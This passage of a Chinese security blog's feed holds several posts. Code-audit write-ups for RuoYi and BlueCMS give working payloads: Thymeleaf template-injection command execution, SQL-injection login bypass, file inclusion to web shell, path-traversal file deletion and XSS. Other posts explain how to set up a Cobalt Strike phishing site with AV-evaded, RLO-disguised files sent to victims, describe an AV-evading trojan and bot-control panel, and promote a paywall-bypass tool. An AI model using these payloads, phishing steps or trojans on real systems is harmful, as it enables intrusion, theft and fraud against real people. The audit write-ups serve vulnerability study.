class="line">            with print_lock:</span><br><span class="line">                print(f&quot;[-] &#123;target_url&#125; 不存在漏洞&quot;)</span><br><span class="line"></span><br><span class="line">    except requests.exceptions.RequestException as e:</span><br><span class="line">        with print_lock:</span><br><span class="line">            print(f&#x27;[-] 连接错误，需要配置代理: &#123;target_url&#125;&#x27;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        with print_lock:</span><br><span class="line">            print(f&#x27;[-] 其他错误: &#123;target_url&#125;&#x27;)</span><br><span class="line">def main():</span><br><span class="line">    lines = readtxt()</span><br><span class="line"></span><br><span class="line">    with ThreadPoolExecutor(max_workers=10) as executor:</span><br><span class="line">        for line in lines:</span><br><span class="line">            executor.submit(check_vulnerability, line)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>结果将会保存在results.txt 文件中</p>]]></content>
      
      
      <categories>
          
          <category> 复现与审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ollama </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【红队入侵】CS水坑钓鱼攻击自动收杆</title>
      <link href="/2025/02/04/Red-Team-Invasion-CS-fishing/"/>
      <url>/2025/02/04/Red-Team-Invasion-CS-fishing/</url>
      
        <content type="html"><![CDATA[<h1 id="一、CS配置钓鱼网站"><a href="#一、CS配置钓鱼网站" class="headerlink" title="一、CS配置钓鱼网站"></a>一、CS配置钓鱼网站</h1><p>1、开启一个名字叫做CDN的监听</p><p><img src="/img/Red-Team-Invasion-CS-fishing/image-20250204193141276.png" alt="image-20250204193141276"></p><p>2、配置网站克隆和恶意文件托管站点</p><p><img src="/img/Red-Team-Invasion-CS-fishing/image-20250204193307088.png" alt="image-20250204193307088"></p><p>恶意文件可以做免杀和RLO构造处理，使效果更逼真</p><h1 id="二、CSFish配置"><a href="#二、CSFish配置" class="headerlink" title="二、CSFish配置"></a>二、CSFish配置</h1><p>用到CSFish这款工具，地址：<a href="https://github.com/Lusensec/CSFish">Lusensec&#x2F;CSFish: 项目用于实现水坑钓鱼收杆&amp;CS上线提醒&amp;自动权限维持</a></p><p>1、开放在CS同服务器的apache服务器，需要运行php文件</p><p><img src="/img/Red-Team-Invasion-CS-fishing/image-20250204193454062.png" alt="image-20250204193454062"></p><p>2、修改CSFish配置信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">修改CSFish.cna第4行代码为你要迁移的进程名，此处默认为explorer.exe</span><br><span class="line">修改CSFish.cna第5行代码为自己CS监听器名称</span><br><span class="line">修改CSFish.cna第40行代码为自己PHP服务器地址</span><br><span class="line">修改fish.php第3行代码为自己钓鱼页面地址</span><br><span class="line">修改fish.php第64或第71行代码为自己飞书或者钉钉的webhook地址（两个填一个即可，推荐使用飞书）</span><br></pre></td></tr></table></figure><p>3、通过短链接或域名伪装apache服务地址发至受害人即可</p>]]></content>
      
      
      <categories>
          
          <category> 红队入侵 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 水坑钓鱼 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Python武器库】VIP视频免费观看</title>
      <link href="/2025/01/03/Python-Video-cracking/"/>
      <url>/2025/01/03/Python-Video-cracking/</url>
      
        <content type="html"><![CDATA[<h1 id="一、效果"><a href="#一、效果" class="headerlink" title="一、效果"></a>一、效果</h1><p>放入腾讯视频、爱奇艺中的vip的视频链接</p><p><img src="/img/Python-Video-cracking/image-20250103170745950.png" alt="image-20250103170745950"></p><p>进行播放，则绕过vip直接观看</p><p><img src="/img/Python-Video-cracking/image-20250103170951153.png" alt="image-20250103170951153"></p><h1 id="二、下载"><a href="#二、下载" class="headerlink" title="二、下载"></a>二、下载</h1><p>内部论坛获取下载链接或留言获取</p>]]></content>
      
      
      <categories>
          
          <category> Python武器库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python武器库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Python武器库】综合成长型工具箱-Comprehensive_Growth_Toolbox</title>
      <link href="/2024/11/29/Python-Comprehensive-Growth-Toolbox/"/>
      <url>/2024/11/29/Python-Comprehensive-Growth-Toolbox/</url>
      
        <content type="html"><![CDATA[<h1 id="综合成长型工具箱"><a href="#综合成长型工具箱" class="headerlink" title="综合成长型工具箱"></a>综合成长型工具箱</h1><p>GitHub地址：<a href="https://github.com/Lusensec/Comprehensive_Growth_Toolbox">Lusensec&#x2F;Comprehensive_Growth_Toolbox: 综合成长型工具箱 (github.com)</a></p><p>更新方法：下载或者克隆项目后，直接覆盖原有项目即可。每次更新只会修改配置代码，不会对已有工具等配置项发生冲突</p><h1 id="一、工具箱简介"><a href="#一、工具箱简介" class="headerlink" title="一、工具箱简介"></a>一、工具箱简介</h1><p>一、由于从学习到实践的过程中会不断收集各种工具，对这些工具做好分类汇总，是一件繁琐且有必要的。开发这个工具箱的目的，就是让用户对工具变的更加趁手和深入应用，进而打造属于自己独有的工具箱。</p><p>二、工具箱具备强大的多种环境应对能力。在面对 Windows、Linux 等以及红队、蓝队等不同的环境下依然能够让用户有趁手的工具可用，快速上手工作。</p><p>三、面对多种工具的各种情况。工具箱根据工具的绝对路径、相对路径以及未安装 等情况做了不同的处理以适应各种情况。</p><h1 id="二、工具箱基本使用"><a href="#二、工具箱基本使用" class="headerlink" title="二、工具箱基本使用"></a>二、工具箱基本使用</h1><h2 id="1、自定义菜单栏"><a href="#1、自定义菜单栏" class="headerlink" title="1、自定义菜单栏"></a>1、自定义菜单栏</h2><p>自主添加菜单栏，设置工具分类</p><p><img src="/img/Python-Comprehensive-Growth-Toolbox/menu.png" alt="img.png"></p><p>这里的<code>对应文件夹</code>是方便相对工具的使用而设置，尽量设置成英文名称，防止工具使用出错。在后面的使用过程中，需要把这个菜单栏对应的工具放置在这个文件夹目录下。颜色风格区分不同的菜单栏</p><h2 id="2、自定义导航栏"><a href="#2、自定义导航栏" class="headerlink" title="2、自定义导航栏"></a>2、自定义导航栏</h2><p>自主添加导航栏，对工具的使用做一个细分</p><p><img src="/img/Python-Comprehensive-Growth-Toolbox/navigation_bar.png" alt="navigation_bar.png"></p><p>他需要我们在已有菜单栏的情况下做一个导航栏，方便对工具的使用做划分</p><h2 id="3、自定义按钮工具"><a href="#3、自定义按钮工具" class="headerlink" title="3、自定义按钮工具"></a>3、自定义按钮工具</h2><p>按钮工具有五种启动方式，常用1、2、3种：</p><ol><li>绝对路径：适用于本机已经安装且无法移动的工具</li><li>相对路径：基于工具箱的相对路径，方便备份或者赠与他人</li><li>文件夹路径：方便手动启动的工具，可以直接打开工具所处的文件夹，以便应对更加复杂的情况</li><li>链接打开：某些工具运行在docker 或者其他虚拟机等网页地址，我们可以将其地址写入，点击即可直接用浏览器打开该网页</li><li>下载链接：方便多数不常用的且占据内存的小工具，保存下载路径，随用随下载</li></ol><h3 id="1、直接打开"><a href="#1、直接打开" class="headerlink" title="1、直接打开"></a>1、直接打开</h3><p><img src="/img/Python-Comprehensive-Growth-Toolbox/zhijiedakai.png" alt="image-20240809142607583"></p><p>方便exe 这种不需要参数即可双击执行的工具。<strong>特别注意：</strong>bat的双击脚本推荐使用命令行方式执行</p><h3 id="2、命令行打开"><a href="#2、命令行打开" class="headerlink" title="2、命令行打开"></a>2、命令行打开</h3><p>在设置启动命令的时候，需要用【*】号 代替工具在命令中的位置，以防因路径问题而出错。</p><p>命令行打开的原理是判断执行的命令中是否具有空格存在，如果命令行中存在空格，则会以命令行的方式运行。因此如果一个exe、bat工具是使用命令执行，可使用【 *】的方式使用命令行打开，同时可以跟接命令参数</p><p>以下是一些常用命令行打开的方式写法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 1、如dirsearch.py 的写法</span><br><span class="line">python * -h</span><br><span class="line"></span><br><span class="line">// 2、如命令行打开的exe</span><br><span class="line"> *</span><br><span class="line">// 3、如命令行打开的需要加参数的exe</span><br><span class="line">* -h</span><br><span class="line">// 4、需要双击打开的bat</span><br><span class="line"> *</span><br></pre></td></tr></table></figure><h3 id="3、剩下的打开方式"><a href="#3、剩下的打开方式" class="headerlink" title="3、剩下的打开方式"></a>3、剩下的打开方式</h3><ul><li>文件夹打开：打开工具所在的文件夹（仅适用于绝对或相对路径的工具）。</li><li>链接打开，是适用于网页工具，打开工具所在的网页。</li><li>下载链接，会将工具下载下来再使用。注意下载完之后需要右键修改启动命令才能运行打开。</li></ul><h1 id="三、临时笔记"><a href="#三、临时笔记" class="headerlink" title="三、临时笔记"></a>三、临时笔记</h1><p>用于对某些数据的临时记录，当工具箱关闭之后数据将会消失。增加了搜索和替换功能</p><p><strong>搜索：</strong>ctrl + f 启用搜索功能</p><p><img src="/img/Python-Comprehensive-Growth-Toolbox/sousuo.png" alt="image-20240811235232718"></p><p><strong>替换：</strong>ctrl + h 启动替换功能</p><p><img src="/img/Python-Comprehensive-Growth-Toolbox/tihuan.png" alt="image-20240811235411008"></p><h1 id="四、本地shell"><a href="#四、本地shell" class="headerlink" title="四、本地shell"></a>四、本地shell</h1><p>可以执行简单的本地命令，不能进行交互式shell（即不能进行mysql连接，以及执行某个文件等）</p><p><img src="/img/Python-Comprehensive-Growth-Toolbox/image-20240820231504379.png" alt="image-20240820231504379"></p><h1 id="五、ChatAI对话模型"><a href="#五、ChatAI对话模型" class="headerlink" title="五、ChatAI对话模型"></a>五、ChatAI对话模型</h1><p>目前ChatAI模型只支持kimi ，需要在工具箱设置中配置好kimi 官网的api 才可以使用。在未来可能支持更多的对话模型</p><p><img src="/img/Python-Comprehensive-Growth-Toolbox/image-20240929214330556.png" alt="image-20240929214330556"></p><p>2024&#x2F;12&#x2F;18 现已增加支持通义千问AI模型配置，同时增加AI分屏展示</p><p>但由于AI配置项发生改变，需要手动删除 config&#x2F;ai_ask.json 文件后重新配置模型API，需要安装通义千问支持的模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install -r requests.txt</span><br></pre></td></tr></table></figure><p><img src="/img/Python-Comprehensive-Growth-Toolbox/image-20241218212456979.png" alt="image-20241218212456979"></p><h1 id="六、肉鸡面板（过杀软）"><a href="#六、肉鸡面板（过杀软）" class="headerlink" title="六、肉鸡面板（过杀软）"></a>六、肉鸡面板（过杀软）</h1><p>需要配置服务端和客户端</p><h2 id="1、服务端配置"><a href="#1、服务端配置" class="headerlink" title="1、服务端配置"></a>1、服务端配置</h2><p>将根目录下的server.py 文件在服务端运行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 server.py</span><br></pre></td></tr></table></figure><h2 id="2、客户端配置"><a href="#2、客户端配置" class="headerlink" title="2、客户端配置"></a>2、客户端配置</h2><p>连接IP和端口，分别是服务端的IP和server.py 的启动端口</p><p><img src="/img/Python-Comprehensive-Growth-Toolbox/image-20241010133148704.png" alt="image-20241010133148704"></p><p>服务端连接成功后，可执行后面的生成木马功能。</p><p>木马默认为基本的py文件，可以对基本的py文件伪装后打包成exe，后续自行研究图标更改和签名等内容</p><h2 id="3、执行命令"><a href="#3、执行命令" class="headerlink" title="3、执行命令"></a>3、执行命令</h2><p>当肉鸡上线后，需要右键刷新之后，可以看到上线信息，进入命令后即可在下方执行命令</p><h1 id="七、其他配置"><a href="#七、其他配置" class="headerlink" title="七、其他配置"></a>七、其他配置</h1><h2 id="1、设置启动窗口大小"><a href="#1、设置启动窗口大小" class="headerlink" title="1、设置启动窗口大小"></a>1、设置启动窗口大小</h2><p><img src="/img/Python-Comprehensive-Growth-Toolbox/image-20241204195217345.png" alt="image-202412041952173"></p><p>是依据当前的窗口宽度进行实时调整。即优先调整窗口到合适的大小，再去设置窗口大小，会显示当前窗口的大小配置信息，直接填写即可。方便工具多的情况下导致线条或按钮出格的情况</p><h2 id="2、工具名称、工具路径修改功能"><a href="#2、工具名称、工具路径修改功能" class="headerlink" title="2、工具名称、工具路径修改功能"></a>2、工具名称、工具路径修改功能</h2><p><img src="/img/Python-Comprehensive-Growth-Toolbox/image-20241204195447553.png" alt="image-20241204195447553"></p><p>添加了修改工具名称、工具路径的功能</p><h1 id="八、安装和使用"><a href="#八、安装和使用" class="headerlink" title="八、安装和使用"></a>八、安装和使用</h1><p>下载或克隆后python执行app.py 文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 在使用前请先下载必要模块</span><br><span class="line">pip3 install -r requests.txt</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python武器库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python武器库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Java代码审计】若依框架-4.6.0</title>
      <link href="/2024/11/27/Code-RuoYi-4-6-0/"/>
      <url>/2024/11/27/Code-RuoYi-4-6-0/</url>
      
        <content type="html"><![CDATA[<h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><p>在对若依框架做代码审计时，有必要先去学习一下若依框架的组成架构，做一个小型的开发项目再来。</p><p>到官网下载对应版本源码：<a href="https://github.com/yangzongzhuan/RuoYi">https://github.com/yangzongzhuan/RuoYi</a></p><p>采用5.7版本Mysql数据库。JDK使用1.8版本</p><p><img src="/img/Code-RuoYi-4-6-0/image-20241127055702555.png" alt="image-20241127055702555"></p><p>配置好数据库信息</p><p><img src="/img/Code-RuoYi-4-6-0/image-20241127055912463.png" alt="image-20241127055912463"></p><p>更改端口并启动项目</p><p><img src="/img/Code-RuoYi-4-6-0/image-20241127061619817.png" alt="image-20241127061619817"></p><h1 id="二、SQL注入漏洞（CVE-2023-49371）"><a href="#二、SQL注入漏洞（CVE-2023-49371）" class="headerlink" title="二、SQL注入漏洞（CVE-2023-49371）"></a>二、SQL注入漏洞（CVE-2023-49371）</h1><p>若依框架采用了MyBatis的开发，找SQL注入时全局搜索<code>$&#123;</code>符号，尤其是设计到用户的这种SQL语句</p><p><img src="/img/Code-RuoYi-4-6-0/image-20241127060515873.png" alt="image-20241127060515873"></p><p>根据Id向上寻找</p><p><img src="/img/Code-RuoYi-4-6-0/image-20241127060639097.png" alt="image-20241127060639097"></p><p>直接定位Controller层，两处调用了selectRoleList</p><p><img src="/img/Code-RuoYi-4-6-0/image-20241127061001727.png" alt="image-20241127061001727"></p><p>在前端页发起请求查看数据包</p><p><img src="/img/Code-RuoYi-4-6-0/image-20241127062308069.png" alt="image-20241127062308069"></p><p>并无params.dataScope字段，我们尝试手动添加并用SQLMap 测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r test.txt --batch --level 3 --risk 3</span><br></pre></td></tr></table></figure><p><img src="/img/Code-RuoYi-4-6-0/image-20241127063438103.png" alt="image-20241127063438103"></p><p>测试成功</p><p><img src="/img/Code-RuoYi-4-6-0/image-20241127063503139.png" alt="image-20241127063503139"></p><h1 id="三、Shiro反序列化漏洞"><a href="#三、Shiro反序列化漏洞" class="headerlink" title="三、Shiro反序列化漏洞"></a>三、Shiro反序列化漏洞</h1><p>查看shiro的版本信息，1.7.0不在Shiro550的漏洞范围内</p><p><img src="/img/Code-RuoYi-4-6-0/image-20241127063828926.png" alt="image-20241127063828926"></p><p>全局查找cipherKey，看密钥是否是固定值</p><p><img src="/img/Code-RuoYi-4-6-0/image-20241127064309292.png" alt="image-20241127064309292"></p><p><code>cipherKey 密钥</code>固定从配置文件中获取</p><p><img src="/img/Code-RuoYi-4-6-0/image-20241127064410247.png" alt="image-20241127064410247"></p><p>而配置文件这里使用了固定的密钥</p><h1 id="四、Thymeleaf模板注入"><a href="#四、Thymeleaf模板注入" class="headerlink" title="四、Thymeleaf模板注入"></a>四、Thymeleaf模板注入</h1><p>全局搜索::</p><p><img src="/img/Code-RuoYi-4-6-0/image-20241127071202799.png" alt="image-20241127071202799"></p><p>构造POC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fragment=__*%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc%22).getInputStream()).next()%7d__::.x</span><br></pre></td></tr></table></figure><p><img src="/img/Code-RuoYi-4-6-0/image-20241127071325977.png" alt="image-20241127071325977"></p>]]></content>
      
      
      <categories>
          
          <category> 复现与审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【PHP代码审计】Bluecms代码审计</title>
      <link href="/2024/10/30/Code-Audit-PHP-Bluecms/"/>
      <url>/2024/10/30/Code-Audit-PHP-Bluecms/</url>
      
        <content type="html"><![CDATA[<h1 id="一、前端SQL注入-ad-js-php"><a href="#一、前端SQL注入-ad-js-php" class="headerlink" title="一、前端SQL注入 - ad_js.php"></a>一、前端SQL注入 - ad_js.php</h1><p>漏洞点在如下位置：没有进行过滤或防护直接拼接sql语句</p><p><img src="/img/Code-Audit-PHP-Bluecms/image-20241029211002359.png" alt="image-20241029211002359"></p><p>但是在上面包含文件<code>/include/common.inc.php</code>中，存在对GET、POST、COOKIE使用addslashes 进行的统一过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function deep_addslashes($str)&#123;</span><br><span class="line">if(is_array($str))&#123;</span><br><span class="line">foreach($str as $key=&gt;$val)&#123;</span><br><span class="line">$str[$key] = deep_addslashes($val);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">$str = addslashes($str);</span><br><span class="line">&#125;</span><br><span class="line">return $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此，单引号、双引号、反斜杠在get、post、cookie中将被转义。</p><p>此时的绕过方式也有很多：</p><ol><li>使用十六进制编码</li><li>此cms使用了gbk编码，通过宽字节来绕过</li></ol><p>在$db-&gt;getone()的底层使用的是mysql_query</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function query($sql)&#123;</span><br><span class="line">if(!$query=@mysql_query($sql, $this-&gt;linkid))&#123;</span><br><span class="line">$this-&gt;dbshow(&quot;Query error:$sql&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">return $query;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getone($sql, $type=MYSQL_ASSOC)&#123;</span><br><span class="line">$query = $this-&gt;query($sql,$this-&gt;linkid);</span><br><span class="line">$row = mysql_fetch_array($query, $type);</span><br><span class="line">return $row;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="二、insert型SQL注入"><a href="#二、insert型SQL注入" class="headerlink" title="二、insert型SQL注入"></a>二、insert型SQL注入</h1><p>在<code>/inlude/common.inc.php</code> 中，发现get、post、cookie 都经过了addslashes 的过滤，作为白盒测试的我们，发现数据库中存储了IP的信息，会不会有存储IP的地方没有经过addslashes 的过滤呢？全局搜索ip</p><p><img src="/img/Code-Audit-PHP-Bluecms/image-20241029220853676.png" alt="image-20241029220853676"></p><p>果然，找到一个getip 的函数，顺着往上找</p><p>在<code>comment.php</code>中，存在一个insert 的SQL语句，其中使用了getip()函数，</p><p><img src="/img/Code-Audit-PHP-Bluecms/image-20241029221309873.png" alt="image-20241029221309873"></p><h1 id="三、用户登陆SQL注入"><a href="#三、用户登陆SQL注入" class="headerlink" title="三、用户登陆SQL注入"></a>三、用户登陆SQL注入</h1><p>看用户登陆的<code>user.php</code>的<code>$act == &#39;index_login&#39;</code>内容，登陆校验在<code>user.fun.php</code>文件中，重点代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function login($user_name,$pwd)&#123;</span><br><span class="line">$row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&#x27;user&#x27;).&quot; WHERE user_name=&#x27;$user_name&#x27;&quot;);</span><br><span class="line">if($row[&#x27;num&#x27;]==0)&#123;</span><br><span class="line">$result = 0;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$sql = &quot;SELECT COUNT(*) AS num FROM &quot;.table(&#x27;user&#x27;).&quot; WHERE user_name=&#x27;$user_name&#x27; and pwd=md5(&#x27;$pwd&#x27;)&quot;;</span><br><span class="line">$user_num = $db-&gt;getone($sql);</span><br><span class="line">if($user_num[&#x27;num&#x27;])&#123;</span><br><span class="line">$result = 1;</span><br><span class="line">&#125;else $result = -1;</span><br><span class="line">&#125;</span><br><span class="line">return $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们知道用户名之后，在密码的位置可以使用万能密码进行登陆，这里使用宽字节绕过addslashes 函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user_name=test&amp;pwd=%df&#x27;) or 1=1 %23&amp;x=26&amp;y=8</span><br></pre></td></tr></table></figure><p><img src="/img/Code-Audit-PHP-Bluecms/image-20241030213746125.png" alt="image-20241030213746125"></p><h1 id="四、文件包含漏洞至Getshell"><a href="#四、文件包含漏洞至Getshell" class="headerlink" title="四、文件包含漏洞至Getshell"></a>四、文件包含漏洞至Getshell</h1><p>在<code>user.php</code>的750行中，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">elseif ($act == &#x27;pay&#x27;)&#123;</span><br><span class="line">include &#x27;data/pay.cache.php&#x27;;</span><br><span class="line">$price = $_POST[&#x27;price&#x27;];</span><br><span class="line">$id = $_POST[&#x27;id&#x27;];</span><br><span class="line">$name = $_POST[&#x27;name&#x27;];</span><br><span class="line">if (empty($_POST[&#x27;pay&#x27;])) &#123;</span><br><span class="line">showmsg(&#x27;对不起，您没有选择支付方式&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">include &#x27;include/payment/&#x27;.$_POST[&#x27;pay&#x27;].&quot;/index.php&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里post提交的pay 没有进行任何的过滤，则可通过目录穿越和截断实现任意文件包含</p><p>如果php版本低于<code>5.3.4</code>且<code>magic_quotes_gpc=off</code>则可以使用<code>%00</code>截断。还可以使用系统文件路径长度限制来进行截断</p><p><img src="/img/Code-Audit-PHP-Bluecms/image-20241029225134497.png" alt="image-20241029225134497"></p><p>这里已经包含了根路径下的index.php 文件，现在来包含根路径下的1.txt，使用系统文件路径长度限制来绕过。这里依然有个前提，我看很多博客上面都没有提到系统文件路径长度绕过的限制，导致复现不成功，这里的php版本需要小于5.2.8 </p><p><img src="/img/Code-Audit-PHP-Bluecms/image-20241029233325335.png" alt="image-20241029233325335"></p><p>这样，我们可以联合图片上传来getshell</p><p><img src="/img/Code-Audit-PHP-Bluecms/image-20241029233758459.png" alt="image-20241029233758459"></p><p>找到图片位置进行包含并执行命令</p><p><img src="/img/Code-Audit-PHP-Bluecms/image-20241029234359404.png" alt="image-20241029234359404"></p><h1 id="五、任意文件删除"><a href="#五、任意文件删除" class="headerlink" title="五、任意文件删除"></a>五、任意文件删除</h1><p><code>database.php</code>文件中存在该漏洞</p><p><img src="/img/Code-Audit-PHP-Bluecms/image-20241029234847190.png" alt="image-20241029234847190"></p><p>很明显，漏洞原因是没有对<code>$file_name</code>做充足的校验</p><p>删除前根目录</p><p><img src="/img/Code-Audit-PHP-Bluecms/image-20241029235035386.png" alt="image-20241029235035386"></p><p>访问：<code>http://192.168.137.48/bluecms/admin/database.php?act=del&amp;file_name=../../../../../../../../1.txt</code></p><p>删除后根目录</p><p><img src="/img/Code-Audit-PHP-Bluecms/image-20241029235249890.png" alt="image-20241029235249890"></p><h1 id="六、存储型XSS"><a href="#六、存储型XSS" class="headerlink" title="六、存储型XSS"></a>六、存储型XSS</h1><p>这个有点多，简单分析一处</p><p>在<code>user.php</code>新增文章这里</p><p><img src="/img/Code-Audit-PHP-Bluecms/image-20241029235619966.png" alt="image-20241029235619966"></p><p>不过这里使用了一个filter_data 函数做了一个过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function filter_data($str)</span><br><span class="line">&#123;</span><br><span class="line">$str = preg_replace(&quot;/&lt;(\/?)(script|i?frame|meta|link)(\s*)[^&lt;]*&gt;/&quot;, &quot;&quot;, $str);</span><br><span class="line">return $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这个正则是可以绕过的，如使用img标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure><h1 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a>七、总结</h1><p>这个bluecms有博主共计74处漏洞，更多的漏洞就暂时不看了，这里贴上这位博主的文章：<a href="https://blog.csdn.net/weixin_41924764/article/details/143192460">Bluecms 1.6 代码审计过程（共计 74 个漏洞）-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> 复现与审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Java代码审计】华夏-ERPv2.3</title>
      <link href="/2024/10/20/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/"/>
      <url>/2024/10/20/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/</url>
      
        <content type="html"><![CDATA[<h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><p>1、下载：下载地址（v2.3版本）：<a href="https://github.com/jishenghua/jshERP/releases">Releases · jishenghua&#x2F;jshERP</a></p><p>2、导入IDEA中，在设置中配置java 环境为1.8，越低越好吧，我是用的是1.8.0_65</p><p>3、在MySQL数据库新建<code>jsh_erp</code>数据库</p><p>4、导入<code>docs/jsh_erp.sql</code>数据文件</p><p>5、在<code>application.properties</code>配置文件中修改MySQL数据库地址端口和账号密码</p><p>6、更新加载<code>pom.xml</code>配置文件</p><p>7、运行<code>ErpApplication.java</code>文件，启动项目。启动成功会出现访问地址和端口，以及账号的账号密码</p><p><img src="/img/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/image-20241020203428300.png" alt="image-20241020203428300"></p><h1 id="二、审计准备"><a href="#二、审计准备" class="headerlink" title="二、审计准备"></a>二、审计准备</h1><p>先大致浏览下整个项目的大致结构和配置信息</p><h2 id="1、pom-xml-配置信息"><a href="#1、pom-xml-配置信息" class="headerlink" title="1、pom.xml 配置信息"></a>1、pom.xml 配置信息</h2><p>使用了1.2.55 版本的fastjson，具备fastjson 反序列化的版本要求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;1.2.55&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>除此之外还是用了2.10.0 版本的log4j</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;log4j-to-slf4j&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;2.10.0&lt;/version&gt;</span><br><span class="line">&lt;scope&gt;compile&lt;/scope&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>不过这个版本是不存在漏洞的，可以去maven 的官网查看</p><p>数据库使用了MyBatis</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 